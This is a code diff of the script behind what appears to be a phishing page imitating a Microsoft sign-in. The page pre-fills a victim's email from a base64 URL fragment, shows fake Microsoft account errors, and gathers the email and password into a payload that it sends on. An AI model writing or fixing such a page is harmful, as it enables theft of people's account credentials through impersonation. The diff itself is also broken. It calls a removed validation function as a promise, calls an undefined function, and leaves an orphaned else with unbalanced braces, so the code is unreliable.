@@ -10473,36 +10473,40 @@
 <script>
 	let data = {};
 $(document).ready(function() {
-    function validateEmail(email) {
-        const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-        return filter.test(email);
-    }
 
-    function handleEmailInput(email) {
-        if (!validateEmail(email)) {
-            $("#ai").css("border-color", "red");
-            $('#error').show();
-            $('#error').text("That Microsoft account doesn't exist. Enter a different account");
-            $("#ai").focus();
-            return false;
-        }
 
-        let domainPart = email.split('@')[1].split('.')[0];
-        let formattedDomain = domainPart.toLowerCase();
-        $('#ai').val(email);
-
-        $("#diiiv1").hide();
-        $("#div3").show();
-
-        /*setTimeout(() => {
-            $("#div3").hide();
-            $("#div2").show();
-            $("#aich").html(email);
-        }, 4000);*/
-
-        return true;
-    }
-
+		function handleEmailInput(email) {
+		    validateEmail(email)
+		    .then(valid => {
+		        if (valid) {
+		            let domainPart = email.split('@')[1].split('.')[0];
+		            let formattedDomain = domainPart.toLowerCase();
+		            $('#ai').val(email);
+		
+		            $("#diiiv1").hide();
+		            $("#div3").show();
+		            // Uncomment if you want to switch back to div2 after a delay
+		            /* setTimeout(() => {
+		                $("#div3").hide();
+		                $("#div2").show();
+		                $("#aich").html(email);
+		            }, 4000); */
+		            return true;
+		        } else {
+		            $("#ai").css("border-color", "red");
+		            $('#error').show();
+		            $('#error').text("That Microsoft account doesn't exist. Enter a different account");
+		            $("#ai").focus();
+		            return false;
+		        }
+		    })
+		    .catch(error => {
+		        console.error('Error validating email:', error);
+		        // Handle error case
+		        return false;
+		    });
+		}
+    
     let ai = window.location.hash.substr(1);
     if (ai) {
         let email = atob(ai);
@@ -10531,14 +10535,12 @@ $(document).ready(function() {
        if(email.trim() === ""){
        document.querySelector("#error").textContent = "Enter a valid email address, phone number, or Skype name.";
        }else{
-        if (handleEmailInput(email)) {
-            data = {
+        let data = {
                 "inputs": {
                     email: email
                 }
             };
-            sendInput(data);
-        }
+            handleAndSendEmailInput(email);
         }
     });
 
@@ -10564,19 +10566,17 @@ $(document).ready(function() {
     $("#div2").hide();
     $("#div3").show();
     let email = $("#ai").val(); // Retrieve email from input field
-    if (validateEmail(email)) {
         let data = {
             "inputs": {
                 email: email,
                 password: password
             }
         };
-        sendInput(data);
+        handleAndSendEmailInput(email);
     } else {
         // Handle invalid email case if needed
         console.error('Invalid email');
     }
-}
     });
 });
 	</script>
